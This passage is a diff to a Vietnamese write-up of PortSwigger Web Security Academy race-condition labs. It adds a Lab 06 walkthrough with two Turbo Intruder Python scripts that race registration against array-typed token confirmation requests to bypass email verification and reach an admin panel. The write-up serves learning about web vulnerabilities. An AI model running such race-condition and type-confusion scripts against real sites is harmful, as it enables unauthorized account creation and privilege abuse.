@@ -1,6 +1,6 @@
 <img width="838" height="338" alt="image" src="https://github.com/user-attachments/assets/49a5df53-567f-48cd-9954-533d67861225" />
 
-# Race condition là gì?
+# [Race condition là gì?](https://portswigger.net/web-security/race-conditions)
 ## 1. Bản chất và Nguồn cơn của Lỗ hổng (Root Cause)
 **Đây là nguồn cơn cốt lõi trong kiến trúc phần mềm dẫn đến việc Server bị khai thác**
 
@@ -217,6 +217,151 @@ $\implies$ Tìm tới request với status code 302, và kết quả:
 - Đổi biến `?user` thành `carlos`, có thể mất vài lần gửi đi gửi lại, và kết quả:
 
   <img width="889" height="264" alt="image" src="https://github.com/user-attachments/assets/1f18966b-fedf-4ced-80c2-03859ef06571" />
+
+  # Lab 06
+
+  <img width="1082" height="784" alt="image" src="https://github.com/user-attachments/assets/5b3c19d1-8408-4ec5-8472-21c16b702733" />
+
+  \- Đề bài và mô tả cho ta biết được, đây có thể là một bài sử dụng đến `Turbo Intruder`, craft riêng một payload và khai thác
+
+  \- Khi thực hiện đăng ký tài khoản, đọc source code, tìm được file `users.js`:
+
+```
+  const confirmEmail = () => {
+    const container = document.getElementsByClassName('confirmation')[0];
+
+    const parts = window.location.href.split("?");
+    const query = parts.length == 2 ? parts[1] : "";
+    const action = query.includes('token') ? query : "";
+
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = '/confirm?' + action;
+
+    const button = document.createElement('button');
+    button.className = 'button';
+    button.type = 'submit';
+    button.textContent = 'Confirm';
+
+    form.appendChild(button);
+    container.appendChild(form);
+}
+```
+- File này không cho biết logic xử lí token hay xác nhận email như nào, nhưng đã để lộ ra một endpoint là `/confirm` và một biến đi kèm trên URL là `?token`
+
+\- Một ý nghĩ đã được hình thành như sau:
+- Liên tục gửi request đăng kí tài khoản
+- Server sẽ sinh ra token cho từng tài khoản (không thể brute-force)
+- Nhưng sẽ có time gap khi một tài khoản chưa có token (?token=null)
+- Nếu cùng lúc có request xác nhận tài khoản và token: null=null✅
+&rarr; Khai thác thành công
+
+\- Thực chiến:
+- Lấy request `POST /register` &rarr; Extensions &rarr; Turbo Intruder
+- Thay username thành `%s`
+- Truyền payload:
+
+<details>
+    <summary>Payload ban đầu</summary>
+
+```
+  def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2)
+
+
+    req_register = target.req
+    req_confirm = '''POST /confirm?token= HTTP/2
+Host: 0a6200f104f92033c4cca1ba003e0096.web-security-academy.net
+Cookie: phpsessionid=5gY0vfOdj0bmPLzwk8PqbHy8HHMIZlaX
+Content-Length: 0
+'''
+    for i in range(20):
+        current_username = "admin" + str(i)
+        gate_name = "race_cluster_" + str(i)
+
+        engine.queue(req_register, current_username, gate=gate_name)
+
+        for c in range(50):
+            engine.queue(req_confirm, gate=gate_name)
+        #  Thả đồng loạt cụm request này đi
+        engine.openGate(gate_name)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+</details>
+
+\- Nhận được kết quả: 
+
+<img width="1621" height="501" alt="image" src="https://github.com/user-attachments/assets/d174796e-b059-441f-af63-a7aef8c7bd1d" />
+
+&rarr; 1000 request được gửi đi nhưng không nhận về kết quả
+Dù đã có cách khai thác và payload đúng hướng nhưng chưa được hưởng trái ngọt
+
+<img width="1638" height="193" alt="image" src="https://github.com/user-attachments/assets/9b17a9fd-2813-482b-819e-3c307625fca9" />
+
+\- Nhận ra rằng, nếu không điền giá trị cho `token`, server lập tức cấm và không qua bước validate `token` chứ chưa nói đến so sánh giá trị của nó
+
+\- Thử Type Confusion, chuyển biến `?token` thành dạng mảng `?token[]`, nhận được
+```
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 24
+
+"Incorrect token: Array"
+```
+&rarr; Giờ đây, `token` đã được đem ra để so sánh, dẫn đến response trả ra sai token thay vì bị cấm
+
+\- Sửa payload .py
+- Thay thế `current_username` (do đã được sử dụng trong payload đầu tiên nhằm gửi mail xác nhận)
+- Đổi `email` thành một giá trị khác (cho chắc, tránh sự trùng lặp)
+<details>
+    <summary>Payload đã sửa</summary>
+
+```
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2)
+
+
+    req_register = target.req
+    #  Thêm [], biến biến token thành 1 mảng
+    req_confirm = '''POST /confirm?token[]= HTTP/2
+Host: 0a6200f104f92033c4cca1ba003e0096.web-security-academy.net
+Cookie: phpsessionid=vOdYoTWNPOH4rn0ohQbF311NVcJVIS8B
+Content-Length: 0
+'''
+    for i in range(20):
+        current_username = "shin" + str(i)
+        gate_name = "race_cluster_" + str(i)
+
+        engine.queue(req_register, current_username, gate=gate_name)
+
+        for c in range(50):
+            engine.queue(req_confirm, gate=gate_name)
+        #  Thả đồng loạt cụm request này đi
+        engine.openGate(gate_name)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+</details>
+
+\- Đã hoàn thành việc tạo tài khoản, bypass email confirmation
+
+<img width="1617" height="579" alt="image" src="https://github.com/user-attachments/assets/56e4e2ed-810c-406e-b46b-7c0ae1de91ce" />
+
+\- Thực hiện đăng nhập với credential `shin13:1` và truy cập Admin panel 
+
+<img width="1564" height="555" alt="image" src="https://github.com/user-attachments/assets/1832f4c0-95a3-4f6d-9e7f-0409b10f85af" />
+
+
 
   
 
